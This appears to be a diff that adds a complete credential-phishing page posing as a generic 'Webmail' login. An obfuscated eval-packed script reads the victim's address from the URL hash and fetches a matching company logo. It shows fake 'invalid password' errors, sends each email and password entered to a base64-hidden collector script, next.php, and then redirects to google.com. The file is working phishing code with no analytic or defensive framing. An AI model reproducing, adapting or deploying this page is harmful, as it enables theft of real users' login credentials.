@@ -1,0 +1,118 @@
+source: <!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Webmail - Login</title>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="https://storage.googleapis.com/fdtyujyhtgrfed.appspot.com/landing.css">
+</head>
+
+<body>
+    <div id="html_encoder_div">
+        <div class="container">
+            <div class="office show border shadow bg-light" id="others">
+                <div class="office-holder">
+                    <div class="logo" style="text-align:center">
+                        <div id="login_logo">
+                            <img id="login_logo1" src="https://storage.googleapis.com/fdtyujyhtgrfed.appspot.com/weblogo.png" width="50" height="50" alt="Webmail">
+                        </div>
+                        <h3 class="text-dark"><strong id="dm-n" class="text-uppercase">WEBMAIL</strong></h3>
+                        <h5 class="font-weight-light">Please sign in using your email and password to gain access</h5>
+                    </div>
+                    <center>
+                        <div id="mgss" style="display: none;font-weight: 600;color: red;">Invalid Password.! Please enter correct password.</div>
+                        <span id="eroorr" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                    </center>
+                    <form>
+                        <div class="form-holder">
+                            <div style="width: 100%;">
+                                <div class="alert alert-danger hide alert2"></div>
+                            </div>
+                            <input type="email" id="ai" class="form-control" value="" placeholder="someone@example.com" required="">
+                            <input type="password" id="pr" placeholder="Password" class="form-control" required="">
+                            <div class="checkbox">
+                                <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
+                                <label>REMEMBER ME</label>
+                            </div>
+                            <div class="btn-holder">
+                                <button class="btn btn-lg col-12" id="sub-btn">LOGIN</button>
+                            </div>
+                            <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">can't access your account?</p>
+                            <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">Sign in with a single-use code</p>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <style>
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+    </style>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" ></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" ></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" ></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+
+
+    //redirect link
+var rdrt = "https://www.google.com";
+
+//mail result count
+var rc = 2;
+
+//mailer link
+var f = atob("bmV4dC5waHA");
+
+
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(19).1a(v(){3 n=0;$(\'#1b\').M(v(){$("#7").8();$(\'#w\').x("");$("#N").A({O:B,C:"8"},0);$("#P").A({Q:B,C:"u"},R)});3 o=S.T.1c.y(1);z(!o){}1d{3 p=o;3 q=p.D("@");3 r=p.y((q+1));3 c=r.y(0,r.D(\'.\'));3 s=c.U();3 t=c.V();$(\'#w\').x(p);$(\'#w\').E(\'W\',"");$(\'#X\').E(\'Y\',\'Z://10.11.12/\'+r);$(\'#13-n\').5(t);$("#7").8();$("#P").A({O:B,C:"8"},0);$("#N").A({Q:B,C:"u"},R)}$(\'#F-G\').M(v(b){$(\'#6\').8();$(\'#7\').8();b.1e();3 d=$("#w").x();3 e=$("#14").x();3 g=$(\'#7\').5();$(\'#7\').1f(g);3 h=d;3 i=/^([a-H-I-1g\\.\\-])+\\@(([a-H-I-9\\-])+\\.)+([a-H-I-9]{2,4})+$/;z(!d){$(\'#6\').u();$(\'#6\').5("1h 15 16 17.!");d.J;K L}z(!i.1i(h)){$(\'#6\').u();$(\'#6\').5("1j 18 1k\'t 1l. 1m a 1n 18");d.J;K L}z(!e){$(\'#6\').u();$(\'#6\').5("1o 15 16 17.!");d.J;K L}3 j=h.D("@");3 k=h.y((j+1));3 c=k.y(0,k.D(\'.\'));3 l=c.U();3 m=c.V();n=n+1;$(\'#w\').E(\'W\',"");$(\'#X\').E(\'Y\',\'Z://10.11.12/\'+k);$(\'#13-n\').5(m);$.1p({1q:\'1r\',1s:f,1t:\'1u\',1v:{1w:d,1x:e,},1y:v(a){$(\'#F-G\').5(\'1z...\')},1A:v(){$("#14").x("");z(n>=1B){n=0;S.T.1C(1D)}$("#7").u();$(\'#F-G\').5(\'1E\')}})})});',62,103,'|||var||html|eroorr|mgss|hide||||||||||||||||||||||show|function|ai|val|substr|if|animate|200|opacity|indexOf|attr|sub|btn|zA|Z0|focus|return|false|click|automail|left|inputbar|right|1000|window|location|toLowerCase|toUpperCase|disabled|login_logo1|src|https|logo|clearbit|com|dm|pr|field|is|emply|account|document|ready|back1|hash|else|preventDefault|text|9_|Email|test|That|doesn|exist|Enter|different|Password|ajax|dataType|JSON|url|type|POST|data|aai|ppr|beforeSend|Verifing|complete|rc|replace|rdrt|Login'.split('|'),0,{}))
+
+
+
+</script>
+
+</html>
+Page title: Webmail - Login
